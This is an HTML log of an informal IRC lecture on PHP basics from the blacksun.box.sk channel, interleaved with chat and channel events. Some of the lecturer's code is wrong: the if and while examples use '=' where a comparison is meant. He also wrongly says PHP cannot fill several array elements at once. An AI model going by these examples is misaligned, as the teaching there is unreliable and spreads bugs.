@@ -1,0 +1,678 @@
+<html>
+<head>
+      <title>PHP Basics</title>
+<style type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</style>
+</head>
+<body text="#000000" bgcolor="#FFFFFF">
+
+<center><table BORDER=0 CELLSPACING=2 CELLPADDING=2 WIDTH="308" >
+<caption><TBODY>
+<br></TBODY></caption>
+
+<tr>
+<td>
+<pre><font color="#FF0000">.</font><font color="#000000">########</font><font color="#FF0000">...</font>######<font color="#FF0000">..</font>########<font color="#FF0000">..</font>########
+<font color="#FF0000">.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">......
+.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">.......</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">......
+.</font>########<font color="#FF0000">...</font>######<font color="#FF0000">..</font>########<font color="#FF0000">..</font>######<font color="#FF0000">..
+.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.......</font>##<font color="#FF0000">.</font>##<font color="#FF0000">...</font>##<font color="#FF0000">...</font>##<font color="#FF0000">......
+.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">....</font>##<font color="#FF0000">..</font>##<font color="#FF0000">......
+.</font>########<font color="#FF0000">...</font>######<font color="#FF0000">..</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">......</font></pre>
+</td>
+</tr>
+</table></center>
+
+<center>
+<p><a href="http://blacksun.box.sk/" target="_blank">http://blacksun.box.sk/</a>
+<br>Lecturer & Converter: <a href="mailto:aztek@box.sk">AZTEK<a/>
+<br>Lecture: PHP Basics</center>
+
+<p><br>
+<br>
+<br>
+<br>
+<b>&lt;marie></b> Don't drop any missile on Africa, Cyberwolf!
+<br><b>&lt;Guy_SJS></b> haha
+<br><b>&lt;Cyberwolf></b> nah i wont :)
+<br><font color="#FF0000">* Guy_SJS bombs Saudi Arabia</font>
+<br><b>&lt;Cyberwolf></b> k, i have a little announcement to make
+<br><b>&lt;Guy_SJS></b> you getting laid?
+<br><b>&lt;Cyberwolf></b> everyone pay attention please
+<br><b>&lt;FatalCure></b> Raise your hand if your going to DefCon
+<br><b>&lt;Cyberwolf></b> Guy: not yet :)
+<br><b>&lt;Guy_SJS></b> lol
+<br><font color="#FF0000">* chiken will be going next year</font>
+<br><b>&lt;Cyberwolf></b> AZTEK is going to give an improvised lecture
+on PHP
+<br><b>&lt;Cyberwolf></b> so everyone pay attention and start logging :)
+<br><b>&lt;AZTEK> ok sup ppl</b>
+<br><b>&lt;bluehaze></b> woop
+<br><b>&lt;Serial_Killer></b> sup
+<br><b>&lt;chiken></b> yay
+<br><font color="#FF0000">* bluehaze wants voice :-)</font>
+<br><font color="#FF0000">*** Cyberwolf sets mode: +v AZTEK</font>
+<br><b>&lt;Serial_Killer></b> me too
+<br><b>&lt;Serial_Killer></b> ?
+<br><b>&lt;AZTEK> does anyone have any prior experiance in php</b>
+<br><b>&lt;Serial_Killer></b> :)
+<br><b>&lt;Serial_Killer></b> ynot really
+<br><b>&lt;Serial_Killer></b> not*
+<br><b>&lt;bluehaze></b> not much
+<br><b>&lt;bluehaze></b> but..&nbsp; a tiny tiny bit
+<br><b>&lt;AZTEK> if you look around the web now you see the extentions
+.php3 and .php and .php4 alot more now</b>
+<br><b>&lt;AZTEK> even on box</b>
+<br><b>&lt;Cyberwolf></b> in rare occasions .phtml also
+<br><b>&lt;AZTEK> yes</b>
+<br><font color="#FF0000">* bluehaze sees .asp more</font>
+<br><b>&lt;AZTEK> that to</b>
+<br><b>&lt;bluehaze></b> :-)
+<br><b>&lt;AZTEK> what php is is a scripting language inseted into html
+documents</b>
+<br><b>&lt;marie></b> php when looking for things on altavista.
+<br><font color="#FF0000">*** Ghost_Rider has quit IRC (Quit: "You may
+stop this individual, but you can't stop us all... after all, we're all
+alike." -)</font>
+<br><b>&lt;AZTEK> when the server gets a request for a .php or .php3 document</b>
+<br><b>&lt;AZTEK> it starts up the php module(engin)</b>
+<br><b>&lt;Serial_Killer></b> btw what PHP stands for
+<br><b>&lt;Serial_Killer></b> ?
+<br><b>&lt;AZTEK> the module strips out all of the php tags an leaves their
+return values in their place</b>
+<br><font color="#FF0000">*** bluehaze has quit IRC (Quit: good users don't
+use colored quits)</font>
+<br><b>&lt;AZTEK> PHP: HyperText Preprocessor</b>
+<br><b>&lt;AZTEK> thatnks for the ? i almost forgot</b>
+<br><b>&lt;Serial_Killer></b> np
+<br><b>&lt;Serial_Killer></b> but why P comes first
+<br>&lt;<b>AZTEK> thought i have also seen Personal Homepage Preprocessor</b>
+<br><b>&lt;Serial_Killer></b> oks
+<br><b>&lt;AZTEK> PHP tags are started &lt;?php and ended ?></b>
+<br><b>&lt;HardW1r3></b> ok in someones opinion what is the best book to
+learn perl from?
+<br><b>&lt;AZTEK> anything in those tages is attemted to be executed by
+the module</b>
+<br><b>&lt;Serial_Killer></b> PErl by example
+<br><b>&lt;Serial_Killer></b> great book
+<br><b>&lt;HardW1r3></b> cool
+<br><b>&lt;AZTEK> Perl : Black Book</b>
+<br><b>&lt;HardW1r3></b> thx
+<br><b>&lt;HardW1r3></b> ok
+<br><b>&lt;AZTEK> now on to php</b>
+<br><b>&lt;AZTEK> you can also use &lt;? to start and ?> to end (not good
+if you use xml</b>
+<br><b>&lt;AZTEK> or the &lt;% %> asp tags are also accepted in some casses</b>
+<br><b>&lt;AZTEK> any comments in php can be given the c type comment which
+is eyerthing between /* and */</b>
+<br><b>&lt;AZTEK> the C++ type comments which is everything on the line
+after the //</b>
+<br><b>&lt;AZTEK> and also the unix shell comments which is every thing
+on the line after the #</b>
+<br><font color="#FF0000">* Serial_Killer does not know C++</font>
+<br><b>&lt;AZTEK> its alright</b>
+<br><b>&lt;AZTEK> now to run php scripts you need access to a server that
+runs the php module</b>
+<br><b>&lt;AZTEK> some people(inculding me) have set up test servers on
+their computers</b>
+<br><b>&lt;AZTEK> everyone got this so far</b>
+<br><font color="#FF0000">*** DockAlfer has joined #bsrf</font>
+<br><b>&lt;Cyberwolf></b> yup
+<br><b>&lt;Serial_Killer></b> not really
+<br><b>&lt;Serial_Killer></b> :)
+<br><b>&lt;AZTEK> its ok</b>
+<br><b>&lt;Cyberwolf></b> damn, i gotta go, plz send me the logs at: cyberwolf@urgent-urgent-urgent.com
+<br><b>&lt;Serial_Killer></b> hehe
+<br><b>&lt;Cyberwolf></b> bye all
+<br><font color="#FF0000">*** Cyberwolf has quit IRC (Quit: Life without
+risk is no life at all)</font>
+<br><b>&lt;AZTEK> i will cyberwolf</b>
+<br><b>&lt;Serial_Killer></b> too late
+<br><b>&lt;_medved-></b> where am I?
+<br><b>&lt;AZTEK> now as most programmers know usully the first thing you
+learn to do is output the text Hello, World</b>
+<br><b>&lt;AZTEK> iNPROV php lecture</b>
+<br><b>&lt;AZTEK> so here is the line that would do this</b>
+<br><b>&lt;AZTEK> &lt;?php</b>
+<br><b>&lt;AZTEK> echo "hello world";</b>
+<br><b>&lt;AZTEK> ?></b>
+<br><b>&lt;AZTEK> as i have said the &lt;?php tells the engin to start
+executing the code after it</b>
+<br><b>&lt;AZTEK> the echo command simply outputs the text to the screen</b>
+<br><b>&lt;AZTEK> every stament as in other anguages is ended with a ;
+(simicoln)</b>
+<br><b>&lt;AZTEK> the the code is ended with a ?></b>
+<br><b>&lt;AZTEK> to tell the engin to stop executing</b>
+<br><b>&lt;AZTEK> everyone following along</b>
+<br><font color="#FF0000">*** DockAlfer is now known as DockAl[shower]</font>
+<br><b>&lt;Serial_Killer></b> yeahh
+<br><b>&lt;FatalCure></b> uh huh
+<br><b>&lt;AZTEK> no seriously if you arnt tell me</b>
+<br><b>&lt;AZTEK> i will go back</b>
+<br><b>&lt;AZTEK></b> can anyone tell me the difference between php and
+perl
+<br><b>&lt;HardW1r3></b> ive heard that it is better somehow but im not
+sure how
+<br><b>&lt;HardW1r3></b> i dunno
+<br><font color="#FF0000">*** bomb8595 has joined #bsrf</font>
+<br><font color="#FF0000">*** GhostDog has quit IRC (Quit: The surest sign
+that intelligent life exists elsewhere in the universe is that it has neve)</font>
+<br><b>&lt;HardW1r3></b> hey bomb
+<br><b>&lt;AZTEK></b> perl is better in the sence it has been around longer
+and has more librarys
+<br><b>&lt;bomb8595></b> hi
+<br><b>&lt;HardW1r3></b> ah
+<br><b>&lt;HardW1r3></b> k
+<br><b>&lt;FatalCure></b> perls engine is started by #!/usr/bin perl
+<br><font color="#FF0000">*** Mikkkeee has joined #bsrf</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o Mikkkeee</font>
+<br><b>&lt;HardW1r3></b> hey mikkkeee
+<br><b>&lt;AZTEK> php on the other hand is faster(in some retrospect),
+and is easyer to insert into html</b>
+<br><b>&lt;AZTEK> hi mikkkeee</b>
+<br><b>&lt;Paya></b> hi mikkkeee
+<br><b>&lt;Serial_Killer></b> AZTEK what u think which one is better
+<br><b>&lt;Serial_Killer></b> ?
+<br><b>&lt;Mikkkeee></b> hey guys
+<br><b>&lt;AZTEK> i personally like php better</b>
+<br><b>&lt;Serial_Killer></b> any reasons for that
+<br><b>&lt;AZTEK> it is easy to learn and was specifficly desinged for
+cgi work</b>
+<br><b>&lt;Serial_Killer></b> o.k
+<br><b>&lt;AZTEK> while perl was designed for exracting and listing text
+files</b>
+<br><b>&lt;AZTEK> quote the name pratical extraction and reporting language</b>
+<br><b>&lt;Mikkkeee></b> yahoooooooooooo a php lecture
+<br><b>&lt;AZTEK> but dont let php fool you it is extreamly prowerful</b>
+<br><b>&lt;Mikkkeee></b> want to make it a real one aztek?
+<br><b>&lt;Paya></b> yes, sure
+<br><b>&lt;Mikkkeee></b> k
+<br><b>&lt;AZTEK></b> its best advantage is its ability to interacte with
+databasses
+<br><b>&lt;AZTEK></b> sure
+<br><font color="#FF0000">*** Mikkkeee sets mode: +m</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Balle[away]</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v bomb8595</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Casper[WORK]</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v chiken</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Crash_Gnome</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v EliteLamer</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v FatalCure</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Grendel</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v DockAl[shower]</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v HardW1r3</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Kage</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Liquid</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v marie</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Serial_Killer</font>
+<br><font color="#FF0000">*** Paya sets mode: +v _medved-</font>
+<br><font color="#FF0000">*** BootError has joined #Bsrf</font>
+<br><font color="#FF0000">*** Paya sets mode: +v _MikeStevens-</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v BootError</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +o AZTEK</font>
+<br><b>&lt;AZTEK> php4 now has built in mysql capability</b>
+<br><b>&lt;bomb8595></b> mikkkee: meeting?
+<br><b>&lt;Mikkkeee></b> aztek hold a bit
+<br><b>&lt;Mikkkeee></b> okay lets start
+<br><b>&lt;AZTEK> to make a short list php can interact with orcale,mysqu,msql,mssql,access,and
+many more dtabasses</b>
+<br><b>&lt;Mikkkeee></b> ______&nbsp; _______&nbsp; ______ _______
+<br><b>&lt;Mikkkeee></b> |_____] |______ |_____/ |______
+<br><b>&lt;Mikkkeee></b> |_____] ______| |&nbsp;&nbsp;&nbsp; \_ |
+<br><b>&lt;Mikkkeee></b>
+<br><b>&lt;Mikkkeee></b> okay php lecture time
+<br><b>&lt;Mikkkeee></b> lecturer=AZTEK
+<br><b>&lt;BootError></b> Woot!
+<br><b>&lt;HardW1r3></b> go aztek go
+<br><font color="#FF0000">* BootError boos</font>
+<br><b><font color="#000000">&lt;AZTEK> thanx</font></b>
+<br><b>&lt;BootError></b> No problemo
+<br><b>&lt;Serial_Killer></b> np
+<br><b>&lt;BootError></b> :))
+<br><b>&lt;Mikkkeee></b> its all yours
+<br><b>&lt;AZTEK> now anyone with any programming know how knows that programs
+are no good without variables</b>
+<br><b>&lt;AZTEK> well php uses the $ (us dollar) sign to decalre a variable</b>
+<br><font color="#FF0000">* Balle[away] 0,12 Away 0,1 Balle 15is not here
+11(0Im sleeping.. goddamit..11) (022:09:38 11)</font>
+<br><b>&lt;Paya></b> like in Perl
+<br><b>&lt;AZTEK> yes like in perl</b>
+<br><b>&lt;AZTEK> but php does it little different</b>
+<br><b>&lt;AZTEK> for an array</b>
+<br><b>&lt;AZTEK> perl would use the @ sign</b>
+<br><b>&lt;AZTEK> well in php their is no special sign</b>
+<br><b>&lt;Paya></b> ?
+<br><b>&lt;AZTEK> an array is defined as $hello[0]</b>
+<br><b>&lt;AZTEK> as wih in perl it would be @hello</b>
+<br><b>&lt;AZTEK> php like perl defines the variable type for you</b>
+<br><b>&lt;FatalCure></b> so an array in php is deffined the same way a
+variable would be in perl, as in $hello["1", "2", "3"]
+<br><b>&lt;Mikkkeee></b> is it?
+<br><b>&lt;AZTEK> so you dont have to define a variable as a interger or
+a string explictly</b>
+<br><b>&lt;BootError></b> kool
+<br><b>&lt;FatalCure></b> aahhh
+<br><b>&lt;Mikkkeee></b> k
+<br><b>&lt;AZTEK> no in php you cant define multiple cells at once</b>
+<br><b>&lt;AZTEK> as far as i know</b>
+<br><b>&lt;AZTEK> so like $hello[0]="Hello"</b>
+<br><b>&lt;AZTEK> $hello[1]=12</b>
+<br><b>&lt;Paya></b> how do u mean "can't define multiple cells", then
+PHP is a crap
+<br><b>&lt;AZTEK> and $hello[2]="12" all work</b>
+<br><b>&lt;AZTEK> its a downfall</b>
+<br><b>&lt;AZTEK> you can define multiple cells</b>
+<br><b>&lt;AZTEK> just not at once</b>
+<br><b>&lt;Paya></b> great
+<br><b>&lt;AZTEK> not like you had it</b>
+<br><b>&lt;Mikkkeee></b> hey aztek if u got time at the end, get out some
+precoded scripts and explain the code in each?
+<br><b>&lt;AZTEK> ok</b>
+<br><b>&lt;AZTEK> like the one for you</b>
+<br><font color="#FF0000">*** bomb8595 has quit IRC (Quit: )</font>
+<br><b>&lt;AZTEK> so</b>
+<br><font color="#FF0000">*** bomb8595 has joined #bsrf</font>
+<br><font color="#FF0000">*** DockAl[shower] is now known as DockAlfer</font>
+<br><b>&lt;AZTEK> &lt;?php</b>
+<br><b>&lt;AZTEK> $hello="Hello";</b>
+<br><b>&lt;AZTEK> echo $hello;</b>
+<br><b>&lt;AZTEK> ?></b>
+<br><b>&lt;AZTEK> gives us Hello</b>
+<br><b>&lt;AZTEK> out to the screen</b>
+<br><b>&lt;BootError></b> PHP reminds me of C, DOS batch file programing
+and Basic
+<br><font color="#FF0000">*** MANOWAR^ has joined #bsrf</font>
+<br><b>&lt;AZTEK> exactly</b>
+<br><b>&lt;AZTEK> now has anyone had any past experiance with Java,Javascript,C/C++</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v bomb8595</font>
+<br><b>&lt;AZTEK> Javascript is especially good</b>
+<br><font color="#FF0000">* BootError has</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v MrJezus|Gaming</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v MANOWAR^</font>
+<br><b>&lt;Paya></b> me, with C/C++
+<br><b>&lt;AZTEK> good</b>
+<br><font color="#FF0000">*** chiken has quit IRC (Quit: If I told you
+I was lieing, would you believe me?)</font>
+<br><b>&lt;MANOWAR^></b> -v plz
+<br><b>&lt;Paya></b> Perl...
+<br><font color="#FF0000">*** Mikkkeee sets mode: -v MANOWAR^</font>
+<br><b>&lt;BootError></b> BASIC and C
+<br><b>&lt;AZTEK> because as you will notice the syntax looks alot like
+C/C++,Javascript,Java</b>
+<br><b>&lt;AZTEK> and perl</b>
+<br><b>&lt;Paya></b> hehe
+<br><b>&lt;AZTEK> if your server uses Apache (almost everyone does) their
+are predefined variables you can work with</b>
+<br><b>&lt;AZTEK> like $REMOTE_ADDR will give you the clients ip address</b>
+<br><b>&lt;Mikkkeee></b> back to the lecture plz
+<br><b>&lt;AZTEK></b> yes it has to be caps
+<br><b>&lt;Paya></b> u mean %ENV arrays
+<br><font color="#FF0000">*** DreaMeR has joined #bsrf</font>
+<br><b>&lt;AZTEK> yes the same thing</b>
+<br><b>&lt;AZTEK> as it is in perl</b>
+<br><b>&lt;Paya></b> $QUEARY_STRING...
+<br><b>&lt;Paya></b> *$QUERY
+<br><b>&lt;AZTEK> now to output a variable in php</b>
+<br><b>&lt;AZTEK> same thing</b>
+<br><font color="#FF0000">*** Canticle has joined #bsrf</font>
+<br><b>&lt;AZTEK> you can use the echo command</b>
+<br><font color="#FF0000">*** IriSh-IrO has joined #bsrf</font>
+<br><font color="#FF0000">*** IriSh-IrO has quit IRC (Client exited)</font>
+<br><b>&lt;AZTEK> so echo $hello;</b>
+<br><b>&lt;AZTEK> would out put the the contents of $hello</b>
+<br><font color="#FF0000">*** _newbie- has joined #bsrf</font>
+<br><b>&lt;AZTEK> you can also use variable in strings</b>
+<br><b>&lt;AZTEK> like in $hello="Hello, $world";</b>
+<br><b>&lt;Paya></b> like in Perl print "Your age is: $age\n";
+<br><b>&lt;AZTEK> the string would consist of the words Hello, and whatever
+is in the variable $world</b>
+<br><b>&lt;AZTEK> yes</b>
+<br><b>&lt;AZTEK> thanks Paya</b>
+<br><font color="#FF0000">*** Paya sets mode: +v _newbie-</font>
+<br><b>&lt;AZTEK> now a thing that makes php great and gives it an advantage
+over perl is</b>
+<br><b>&lt;AZTEK> the valuse passed to your php script</b>
+<br><b>&lt;AZTEK> via an html from are made into variable themselves imdiatly</b>
+<br><b>&lt;_newbie-></b> does IIS support php?
+<br><b>&lt;_newbie-></b> i mean, is there a plugin
+<br><b>&lt;AZTEK> so &lt;input type="text" name="hi"></b>
+<br><b>&lt;AZTEK> yes it does</b>
+<br><b>&lt;_newbie-></b> ah ok
+<br><b>&lt;Mikkkeee></b> aztek will u got into db's?
+<br><b>&lt;_newbie-></b> continue, i wanna learn php too hehe
+<br><b>&lt;AZTEK> when sent to your programm the variable $hi will have
+the value of that text fiels</b>
+<br><b>&lt;AZTEK> *field</b>
+<br><b>&lt;AZTEK> not today</b>
+<br><b>&lt;AZTEK> maybe in a follow up tut</b>
+<br><b>&lt;Mikkkeee></b> yup
+<br><b>&lt;_newbie-></b> ok
+<br><b>&lt;AZTEK> does everyone understand the basics of php variable</b>
+<br><b>&lt;Paya></b> yes, continue
+<br><b>&lt;_newbie-></b> yep
+<br><b>&lt;FatalCure></b> uh huh]
+<br><b>&lt;AZTEK> now another thing a script/programm can not be without
+is flow control</b>
+<br><b>&lt;AZTEK> the ifs, elseifs, and elses</b>
+<br><b>&lt;marie></b> No, but it's alright. I need to go, goodbye.
+<br><font color="#FF0000">*** marie has quit IRC (Quit: )</font>
+<br><b>&lt;AZTEK> a if statment is the exact same as if it were in a C
+programm</b>
+<br><b>&lt;AZTEK> the syntax for a if stament is</b>
+<br><b>&lt;AZTEK> if (condention) {</b>
+<br><b>&lt;AZTEK> BLOCK of code;</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;AZTEK> if the condention exicutes to be true then the code inside
+the brakets is executed</b>
+<br><b>&lt;AZTEK> example</b>
+<br><font color="#FF0000">*** _newbie- has left #bsrf</font>
+<br><font color="#FF0000">*** DreaMeR has quit IRC (Client exited)</font>
+<br><b>&lt;AZTEK> if($hello="Hi") {</b>
+<br><b>&lt;AZTEK> echo $hello;</b>
+<br><b>&lt;AZTEK> }</b>
+<br><font color="#FF0000">*** vanished has joined #BSRF</font>
+<br><b>&lt;FatalCure></b> can you set a verable to recive keystrokes and
+then use that in an if statment?like STDIN w/ perl?
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v vanished</font>
+<br><b>&lt;AZTEK></b> you can add ifelse to
+<br><b>&lt;AZTEK></b> no
+<br><b>&lt;vanished></b> thanks
+<br><b>&lt;AZTEK> php is strictly a cgi language</b>
+<br><b>&lt;AZTEK> ell not anymore but i will get to that later</b>
+<br><b>&lt;AZTEK> so</b>
+<br><b>&lt;AZTEK> if($hello="Hi") {</b>
+<br><b>&lt;AZTEK> echo $hello;</b>
+<br><b>&lt;AZTEK> } else {</b>
+<br><b>&lt;AZTEK> echo "No Hello";</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;AZTEK> is an example of flow control</b>
+<br><b>&lt;AZTEK> if the value of th variable $hello is not the string
+Hi the the code in the else stament is executed</b>
+<br><b>&lt;AZTEK> everyone got this so far</b>
+<br><b>&lt;vanished></b> ya
+<br><font color="#FF0000">*** Paya sets mode: +v Canticle</font>
+<br><b>&lt;HardW1r3></b> yup
+<br><b>&lt;AZTEK> you can have as many ifs anf ifelses as you need but
+you can only have one else</b>
+<br><b>&lt;AZTEK> or the engin will get confused</b>
+<br><b>&lt;Canticle></b> ya.. when php code runs is it something like mod_perl?
+Im a php newbie but Ive used mod_perl and perl
+<br><font color="#FF0000">*** Kazzuyo has joined #bsrf</font>
+<br><b>&lt;AZTEK> now i will go onto loops so those of you who don't understand
+please speak up</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Kazzuyo</font>
+<br><b>&lt;Kazzuyo></b> hi
+<br><b>&lt;AZTEK> it can be a module in apache or an external program that
+parsses the script and returns it</b>
+<br><b>&lt;Kazzuyo></b> brb
+<br><b>&lt;Canticle></b> so like perl?
+<br><font color="#FF0000">*** Kazzuyo has left #bsrf</font>
+<br><b>&lt;AZTEK> yes</b>
+<br><font color="#FF0000">*** wishmaster has joined #bsrf</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +v wishmaster</font>
+<br><b>&lt;Canticle></b> thanks
+<br><b>&lt;wishmaster></b> yo all
+<br><b>&lt;wishmaster></b> wasssup guys>?
+<br><b>&lt;AZTEK> only the program or module has to be defined in the apache
+conf files</b>
+<br><b>&lt;Paya></b> we're in the middle of the lecture
+<br><b>&lt;AZTEK> unless you wan to add #!/usr/bin/php</b>
+<br><font color="#FF0000">*** Kazzuyo has joined #bsrf</font>
+<br><font color="#FF0000">* Canticle nods</font>
+<br><font color="#FF0000">*** _052_ has quit IRC (Ping timeout)</font>
+<br><b>&lt;AZTEK> or whatever you php executalbe is and make it like perl</b>
+<br><b>&lt;AZTEK> which is not recomended</b>
+<br><b>&lt;AZTEK> the for loop</b>
+<br><b>&lt;Mikkkeee></b> yo wish its a php lecture
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Kazzuyo</font>
+<br><b>&lt;AZTEK> anyone with a C/C++,Java(script) background know theis
+next few</b>
+<br><b>&lt;AZTEK> the for loop follows the syntax</b>
+<br><b>&lt;_medved-></b> YO to wishmaster
+<br><b>&lt;Mikkkeee></b> heh
+<br><font color="#FF0000">*** Paya sets mode: -v _medved-</font>
+<br><b>&lt;vanished></b> ya
+<br><b>&lt;AZTEK> for (starting variable ; lopp unstill this is false ;
+the increcment) {</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;vanished></b> for (i=0; i&lt;10; i++)
+<br><b>&lt;Kazzuyo></b> cool.....
+<br><b>&lt;AZTEK> theis are very good for arrays</b>
+<br><b>&lt;Paya></b> just like in Perl
+<br><b>&lt;AZTEK> you need the $ before the variables</b>
+<br><b>&lt;AZTEK> yep</b>
+<br><b>&lt;vanished></b> ya
+<br><b>&lt;vanished></b> oops
+<br><b>&lt;AZTEK> so</b>
+<br><font color="#FF0000">*** Sigma has joined #bsrf</font>
+<br><b>&lt;Canticle></b> php have all the same variables that are in perl?
+string,hash,array?
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Sigma</font>
+<br><b>&lt;AZTEK> for ($i=0;$i&lt;10;$i++)</b>
+<br><b>&lt;AZTEK> {</b>
+<br><b>&lt;Sigma></b> Thanks Mike
+<br><b>&lt;AZTEK> echo "hello";</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;AZTEK> print aout hello untill the variable $i is ten</b>
+<br><b>&lt;Sigma></b> php doesn't have a seperate data structure for associative
+arrays (hashes). They just let you use strings as keys on any array
+<br><b>&lt;AZTEK> yes php has all the same variable</b>
+<br><b>&lt;AZTEK> thats correct</b>
+<br><b>&lt;Sigma></b> So, @array could be a normal array, or a hash
+<br><b>&lt;vanished></b> php is glorified perl basically
+<br><b>&lt;Canticle></b> I see ok
+<br><b>&lt;AZTEK> scice everytime the code is run the $i++ runs at the
+end</b>
+<br><b>&lt;Sigma></b> vanished: I agree, but it handles variables and input
+so well =)
+<br><b>&lt;AZTEK> the for loop will end after 10 times</b>
+<br><b>&lt;vanished></b> ya
+<br><b>&lt;Canticle></b> from what Ive heard php is basicaly streamlined
+for serving content that perl does but faster
+<br><b>&lt;Canticle></b> for web pages
+<br><b>&lt;vanished></b> php is also a lot more secure :)
+<br><b>&lt;AZTEK> yes</b>
+<br><b>&lt;AZTEK> not so much</b>
+<br><b>&lt;AZTEK> i might get to that later</b>
+<br><b>&lt;Canticle></b> flexability = insecure :)
+<br><b>&lt;vanished></b> true
+<br><font color="#FF0000">*** Duff19 has joined #bsrf</font>
+<br><b>&lt;vanished></b> better than straight perl though
+<br><b>&lt;AZTEK> it also handles out put better</b>
+<br><b>&lt;vanished></b> right
+<br><b>&lt;Sigma></b> It's not all that hard to output with perl
+<br><b>&lt;vanished></b> no
+<br><b>&lt;AZTEK> instead of having to use ssi includes or writing your
+whole page in perl</b>
+<br><b>&lt;Sigma></b> SSI is slow =\
+<br><b>&lt;AZTEK> you can just insert the php tags</b>
+<br><b>&lt;AZTEK> example</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Duff19</font>
+<br><b>&lt;AZTEK> &lt;title>&lt;?php echo $title; ?>&lt;/title></b>
+<br><b>&lt;Canticle></b> curious tho for that page tho where would $title&nbsp;
+be defined?
+<br><b>&lt;AZTEK> the would put between the html title tags the value of
+the variable $title</b>
+<br><b>&lt;AZTEK> in an external file</b>
+<br><b>&lt;AZTEK> i will get to that later</b>
+<br><b>&lt;Canticle></b> ah cool
+<br><b>&lt;Sigma></b> Canticle, it might've been in a file, or input from
+another webpage
+<br><b>&lt;Canticle></b> I see, variables in php pages are persistant from
+one to another?
+<br><b>&lt;AZTEK> now from the for loop to the while loop</b>
+<br><b>&lt;Mikkkeee></b> so whats the output of the &lt;title> a normal
+html title?
+<br><b>&lt;Canticle></b> sorry :) I got off topic back to loop
+<br><font color="#FF0000">* Sigma is afk</font>
+<br><font color="#FF0000">*** Sigma is now known as Sigma[a]</font>
+<br><b>&lt;AZTEK> &lt;title>Your title&lt;/title></b>
+<br><b>&lt;AZTEK> now from the for loop to the while loop</b>
+<br><b>&lt;vanished></b> gotta do homework
+<br><b>&lt;AZTEK> the while loop folows the syntax of</b>
+<br><b>&lt;vanished></b> bbl
+<br><font color="#FF0000">*** vanished is now known as vanished[homework]</font>
+<br><b>&lt;AZTEK> while(this is true) {</b>
+<br><b>&lt;AZTEK> do this</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;AZTEK> so</b>
+<br><font color="#FF0000">*** Duff19 has quit IRC (Quit: Leaving)</font>
+<br><b>&lt;AZTEK> while($hello="Hi") {</b>
+<br><b>&lt;AZTEK> echo "Loop";</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;AZTEK> this will of course never end</b>
+<br><b>&lt;AZTEK> and will crash the browser eventully</b>
+<br><b>&lt;AZTEK> which is bad</b>
+<br><b>&lt;AZTEK> the do is esentilly the same it is</b>
+<br><b>&lt;AZTEK> do {</b>
+<br><b>&lt;AZTEK> always do this once</b>
+<br><b>&lt;AZTEK> } while (do it agian if this is true)</b>
+<br><b>&lt;AZTEK> i forgot the ; after the while</b>
+<br><b>&lt;AZTEK> so</b>
+<br><b>&lt;AZTEK> do {</b>
+<br><b>&lt;AZTEK> echo "Hello";</b>
+<br><font color="#FF0000">*** Kazzuyo has quit IRC (Quit: K2K)</font>
+<br><b>&lt;AZTEK> } while($hello1&lt;4);</b>
+<br><b>&lt;AZTEK> this will run once and then run untill the while statment
+is false</b>
+<br><b>&lt;AZTEK> everyone got it</b>
+<br><b>&lt;Canticle></b> I know you did the if/else.. is there a case statement
+as well? Case is usualy easier for me to read if there are 3+ choices
+<br><b>&lt;AZTEK> yes</b>
+<br><b>&lt;AZTEK>&nbsp; i belive</b>
+<br><b>&lt;AZTEK> its is</b>
+<br><b>&lt;AZTEK> switch($varable) {</b>
+<br><b>&lt;AZTEK> case :</b>
+<br><b>&lt;AZTEK> default :</b>
+<br><b>&lt;AZTEK> }</b>
+<br><b>&lt;AZTEK> you know how is goes</b>
+<br><b>&lt;Canticle></b> ok cool. :)
+<br><b>&lt;AZTEK> now i am going to my final and bigest section</b>
+<br><b>&lt;AZTEK> drum roll please</b>
+<br><b>&lt;AZTEK> dudududududud</b>
+<br><b>&lt;AZTEK> file input/output</b>
+<br><b>&lt;AZTEK> this is probly the biggest difference between php and
+perl</b>
